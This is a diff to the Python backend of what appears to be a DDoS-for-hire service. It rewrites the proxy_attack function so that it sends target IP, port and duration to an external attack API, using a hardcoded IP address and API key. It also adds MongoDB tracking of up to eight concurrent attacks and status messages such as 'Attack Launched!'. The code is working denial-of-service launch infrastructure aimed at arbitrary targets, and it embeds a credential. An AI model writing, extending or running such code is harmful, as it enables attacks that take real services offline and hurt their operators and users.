@@ -232,36 +232,85 @@ def encrypted_reply(data_dict):
 
 def proxy_attack(ip, port, time_sec):
     """
-    Forward attack request to VPS proxy — single request, STUN method.
+    Forward attack request to VK API.
+    GET http://API_HOST/vk/launch?key=API_KEY&ip=X&port=Y&time=Z&method=VISHAL
+    Slot system: max 8 concurrent attacks tracked in MongoDB.
     """
     try:
-        payload = {
-            "secret": PROXY_SECRET,
-            "ip": ip,
-            "port": port,
-            "time": time_sec,
-            "method": PROXY_METHOD,
-        }
-        r = requests.post(PROXY_URL, json=payload, timeout=15)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get("status") == "queued":
-                launched = data.get("launchedCount", 1)
+        # Slot system — check active attacks
+        max_slots = 8
+        now = datetime.utcnow()
+        if db is not None:
+            slots_col = db['active_slots']
+            # Remove expired slots (attacks whose time has passed)
+            slots_col.delete_many({'expires_at': {'$lt': now.isoformat() + 'Z'}})
+            active_count = slots_col.count_documents({})
+            if active_count >= max_slots:
                 return {
-                    "status": "queued",
-                    "message": data.get("message", "⚡ Attack Launched!"),
-                    "target": f"{ip}:{port}",
-                    "method": PROXY_METHOD,
-                    "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
+                    "status": "error",
+                    "message": f"All slots busy ({active_count}/{max_slots}). Wait for current attacks to finish.",
+                    "slots": {"active": active_count, "available": 0, "max": max_slots}
                 }
-            return {"status": "error", "message": data.get("message", "Attack failed")}
-        return {"status": "error", "message": f"Proxy returned {r.status_code}"}
+        else:
+            active_count = 0
+
+        # Build API URL
+        api_host = os.getenv('ATTACK_API_BASE', 'http://3.110.174.225:3030')
+        api_key = os.getenv('ATTACK_API_KEY', 'vk_oQuXhkua_5CAxfsa-lqiYHLi7zSn_y8a')
+        method = os.getenv('ATTACK_METHOD', 'VISHAL')
+
+        url = f"{api_host}/vk/launch?key={api_key}&ip={ip}&port={port}&time={time_sec}&method={method}"
+        r = requests.get(url, timeout=15)
+
+        if r.status_code == 200:
+            # Register slot
+            attack_duration = int(time_sec)
+            expires_at = (now + timedelta(seconds=attack_duration)).isoformat() + 'Z'
+            if db is not None:
+                slots_col = db['active_slots']
+                slots_col.insert_one({
+                    'ip': ip,
+                    'port': str(port),
+                    'time': attack_duration,
+                    'method': method,
+                    'started_at': now.isoformat() + 'Z',
+                    'expires_at': expires_at
+                })
+                active_count = slots_col.count_documents({})
+
+            return {
+                "status": "queued",
+                "message": "⚡ Attack Launched!",
+                "target": f"{ip}:{port}",
+                "method": method,
+                "time": int(time_sec),
+                "slots": {"active": active_count + 1, "available": max(max_slots - active_count - 1, 0), "max": max_slots},
+            }
+        else:
+            # Try to parse error from API response
+            try:
+                data = r.json()
+                msg = data.get("message", data.get("error", f"API returned {r.status_code}"))
+            except Exception:
+                msg = f"API returned {r.status_code}"
+            return {"status": "error", "message": msg}
+
     except Exception as e:
-        return {"status": "error", "message": str(e)}
+        return {"status": "error", "message": f"Connection failed: {str(e)}"}
 
 def proxy_status():
-    """Simple online check"""
-    return {"status": "online"}
+    """Return active slots info."""
+    max_slots = 8
+    active_count = 0
+    if db is not None:
+        slots_col = db['active_slots']
+        now = datetime.utcnow()
+        slots_col.delete_many({'expires_at': {'$lt': now.isoformat() + 'Z'}})
+        active_count = slots_col.count_documents({})
+    return {
+        "status": "online",
+        "slots": {"active": active_count, "available": max(max_slots - active_count, 0), "max": max_slots}
+    }
 
 def sign_response(expires_at, device_id):
     msg = "{}|{}".format(expires_at or "", device_id or "")
